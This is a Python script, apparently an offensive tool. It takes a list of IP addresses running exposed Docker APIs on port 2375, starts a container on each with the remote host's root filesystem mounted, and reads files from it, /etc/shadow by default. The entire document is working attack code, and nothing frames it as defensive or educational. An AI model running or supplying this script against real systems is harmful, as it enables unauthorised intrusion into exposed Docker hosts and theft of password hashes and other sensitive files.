import sys
try :
   import docker,argparse
except :
   print("EXCEPTION :( Please install the docker and argparse libraries")
   sys.exit(1)
from argparse import RawTextHelpFormatter



parser = argparse.ArgumentParser(description = "Docker Container Command Exec\nThis script creates a container with the hosts FS mounted, to read files provided in a list of IPs which have the Docker API exposed.\n- github.com/notnotnotveg", formatter_class=RawTextHelpFormatter )
parser.add_argument("-p", "--port", help="Set port (default: 2375)")
parser.add_argument("-c", "--cmd", help="Text File with list of files to be read.Example : \n\t/etc/shadow\n\t/etc/issue.net")

requiredNamed = parser.add_argument_group('required named arguments')
requiredNamed.add_argument("-i", "--ip_file", help="File with new line seperated IPs", required=True)

args = parser.parse_args()

arg_port = "2375"
arg_cmd = "/host/etc/issue.net /host/etc/shadow"

vol_d = {'/': {'bind': '/host', 'mode': 'ro'}}

if args.port:
    arg_port = args.port

if args.cmd:
    arg_cmd = ""
    open_file_cmd = open(args.cmd)
    for LINE in iter(open_file_cmd):
        arg_cmd = arg_cmd + "/host" + LINE.rstrip() + " ";


open_file= open(args.ip_file)
for LINE in iter(open_file):
    ip = LINE.rstrip()
    url = 'tcp://' + ip + ':' + arg_port;
    client = docker.DockerClient(base_url= url)
    print("Host : " + ip + ":" + arg_port)
    try:
        image = client.images.pull('alpine:latest')
        try:
            container = client.containers.create('ubuntu', command='/bin/bash', tty=True, volumes= vol_d)
            container.start()
        except:
            print("EXCEPTION : Cannot start the new container")
            continue

        try:
            print("Output of "+ arg_cmd+ ":")
            print(container.exec_run('cat ' + arg_cmd).output.decode('utf-8'))
        except:
            print("EXCEPTION : Cannot run command on the new container")
            continue

        container.stop()
        container.remove()

    except:
        print("EXCEPTION : Cannot connect to host")
    print("###################################################")
## https://docker-py.readthedocs.io/en/stable/containers.html#container-objects
